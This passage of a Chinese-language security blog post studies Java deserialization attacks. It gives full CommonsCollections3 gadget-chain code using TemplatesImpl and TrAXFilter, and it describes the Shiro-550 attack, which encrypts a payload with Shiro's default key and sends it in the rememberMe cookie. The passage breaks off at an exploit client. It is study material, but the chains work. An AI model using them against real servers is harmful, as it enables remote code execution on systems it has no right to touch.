</span></span><span style=display:flex><span>        <span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#111>code</span> <span style=color:#f92672>=</span> <span style=color:#111>Base64</span><span style=color:#f92672>.</span><span style=color:#75af00>getDecoder</span><span style=color:#f92672>().</span><span style=color:#75af00>decode</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>TemplatesImpl</span> <span style=color:#111>obj</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TemplatesImpl</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_bytecodes&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[][]{</span><span style=color:#111>code</span><span style=color:#f92672>});</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_name&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;HelloTemplatesImpl&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_tfactory&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TransformerFactoryImpl</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#111>transformers</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Transformer</span><span style=color:#f92672>[]{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;newTransformer&#34;</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>null</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>null</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>};</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span> <span style=color:#111>transformerChain</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ChainedTransformer</span><span style=color:#f92672>(</span><span style=color:#111>transformers</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Map</span> <span style=color:#111>innerMap</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>HashMap</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Map</span> <span style=color:#111>outerMap</span> <span style=color:#f92672>=</span> <span style=color:#111>TransformedMap</span><span style=color:#f92672>.</span><span style=color:#75af00>decorate</span><span style=color:#f92672>(</span><span style=color:#111>innerMap</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>,</span> <span style=color:#111>transformerChain</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>outerMap</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;test&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;amiz&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>Object</span> <span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>fieldName</span><span style=color:#f92672>,</span> <span style=color:#111>Object</span> <span style=color:#111>value</span><span style=color:#f92672>)</span><span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Field</span> <span style=color:#111>field</span> <span style=color:#f92672>=</span> <span style=color:#111>obj</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#111>fieldName</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>field</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>field</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>value</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>但是并不是标准的payload，ysoserial中并没有用到InvokerTransformer，原因是<code>SerialKiller</code>的存在限制了它，我们换为<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code></p><p>这个类的构造方法中调用了了<code>(TransformerImpl) templates.newTransformer()</code>，免去了我们的手工调用</p><p>缺少InvokerTransformer无法调用TraAXFilter的构造方法，这里用<code>org.apache.commons.collections.functors.InstantiateTransformer</code>这个Transformer</p><p>所以我们利用<code>InstantiateTransformer</code>调用到<code>TrAXFilter</code>的构造方法，再利用它构造方法中的<code>templates.newTransformer</code>调用到<code>TemplatesImpl</code>里的字节码</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#111>transformers</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Transformer</span><span style=color:#f92672>[]{</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>TrAXFilter</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>new</span> <span style=color:#111>InstantiateTransformer</span><span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]{</span><span style=color:#111>Templates</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>},</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[]{</span><span style=color:#111>obj</span><span style=color:#f92672>})</span>
</span></span><span style=display:flex><span><span style=color:#f92672>};</span>
</span></span></code></pre></div><p>完整CC3</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#111>ysoserial.payloads</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javassist.ClassPool</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.Transformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.ChainedTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.ConstantTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.InstantiateTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.map.TransformedMap</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.xml.transform.Templates</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ByteArrayInputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ByteArrayOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ObjectInputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ObjectOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.annotation.Retention</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.Constructor</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.Field</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.InvocationHandler</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.Base64</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.HashMap</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.Map</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>testCC3</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>TemplatesImpl</span> <span style=color:#111>obj</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TemplatesImpl</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// setFieldValue(obj, &#34;_bytecodes&#34;, new byte[][]{Base64.getDecoder().decode(&#34;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&#34;)});
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_bytecodes&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[][]{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>ClassPool</span><span style=color:#f92672>.</span><span style=color:#75af00>getDefault</span><span style=color:#f92672>().</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>evil</span><span style=color:#f92672>.</span><span style=color:#75af00>EvilTemplatesImpl</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getName</span><span style=color:#f92672>()).</span><span style=color:#75af00>toBytecode</span><span style=color:#f92672>()</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>});</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_name&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;HelloTemplatesImpl&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_name&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;HelloTemplatesImpl&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_tfactory&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TransformerFactoryImpl</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#111>fakeTransformers</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>1</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>};</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#111>transformers</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Transformer</span><span style=color:#f92672>[]{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>TrAXFilter</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>new</span> <span style=color:#111>InstantiateTransformer</span><span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]</span> <span style=color:#f92672>{</span> <span style=color:#111>Templates</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span> <span style=color:#f92672>},</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[]</span> <span style=color:#f92672>{</span> <span style=color:#111>obj</span> <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>};</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span> <span style=color:#111>transformerChain</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ChainedTransformer</span><span style=color:#f92672>(</span><span style=color:#111>fakeTransformers</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Map</span> <span style=color:#111>innerMap</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>HashMap</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>innerMap</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;value&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;xxxx&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Map</span> <span style=color:#111>outerMap</span> <span style=color:#f92672>=</span> <span style=color:#111>TransformedMap</span><span style=color:#f92672>.</span><span style=color:#75af00>decorate</span><span style=color:#f92672>(</span><span style=color:#111>innerMap</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>,</span> <span style=color:#111>transformerChain</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Class</span> <span style=color:#111>cls</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Constructor</span> <span style=color:#111>construct</span> <span style=color:#f92672>=</span> <span style=color:#111>cls</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredConstructor</span><span style=color:#f92672>(</span><span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>Map</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>construct</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>InvocationHandler</span> <span style=color:#111>handler</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>InvocationHandler</span><span style=color:#f92672>)</span> <span style=color:#111>construct</span><span style=color:#f92672>.</span><span style=color:#75af00>newInstance</span><span style=color:#f92672>(</span><span style=color:#111>Retention</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>outerMap</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>transformerChain</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;iTransformers&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>transformers</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>ByteArrayOutputStream</span> <span style=color:#111>barr</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ByteArrayOutputStream</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ObjectOutputStream</span> <span style=color:#111>oos</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectOutputStream</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>writeObject</span><span style=color:#f92672>(</span><span style=color:#111>handler</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ObjectInputStream</span> <span style=color:#111>ois</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectInputStream</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>ByteArrayInputStream</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>.</span><span style=color:#75af00>toByteArray</span><span style=color:#f92672>()));</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Object</span> <span style=color:#111>o</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Object</span><span style=color:#f92672>)</span> <span style=color:#111>ois</span><span style=color:#f92672>.</span><span style=color:#75af00>readObject</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>Object</span> <span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>fieldName</span><span style=color:#f92672>,</span> <span style=color:#111>Object</span> <span style=color:#111>value</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Field</span> <span style=color:#111>field</span> <span style=color:#f92672>=</span> <span style=color:#111>obj</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#111>fieldName</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>field</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>field</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>value</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><h2 id=cck1shiro-550>CCK1(Shiro-550)</h2><p>p牛给出了一个<a href=https://github.com/phith0n/JavaThings/tree/master/shirodemo>小demo</a>，只有两个jsp，依赖有这些</p><ul><li>shiro-core、shiro-web，这是shiro本身的依赖</li><li>javax.servlet-api、jsp-api，这是JSP和Servlet的依赖，仅在编译阶段使用，因为Tomcat中自带这两个依赖</li><li>slf4j-api、slf4j-simple，这是为了显示shiro中的报错信息添加的依赖</li><li>commons-logging，这是shiro中用到的一个接口，不添加会爆java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory错误</li><li>commons-collections，为了演示反序列化漏洞，增加了commons-collections依赖，版本为3.2.1</li></ul><p>打war包后部署在本地</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301201435981.png alt=image-20220301201435981></p><p>抓包可以看到，不勾选<code>Remember Me</code>时cookie有rememberMe=deleteMe，勾选的话则是</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301202246982.png alt=image-20220301202246982></p><p>这里的b64加密信息是AES，在<code>org.apache.shiro.mgt.AbstractRememberMeManager</code>中可以看到默认key</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301232709437.png alt=image-20220301232709437></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301232313280.png alt=image-20220301232313280></p><p>可以看到它在同名的构造函数中设置了这个default key，而控制cookie信息<code>org.apache.shiro.web.mgt.CookieRememberMeManager</code>继承了这个类</p><p>由于它使用了默认key并且用了cc依赖，我们的攻击过程是这样的：</p><ul><li>用CC链生成payload</li><li>用Shiro默认key进行加密</li><li>将密文作为rememberMe的Cookie发送给服务端</li></ul><h3 id=cc6为什么不行>CC6为什么不行</h3><p>p牛写了一个基于CC6的exp</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#111>com.govuln.shiroattack</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.shiro.crypto.AesCipherService</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.shiro.util.ByteSource</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>Client0</span> <span style=color:#f92672>{</span>
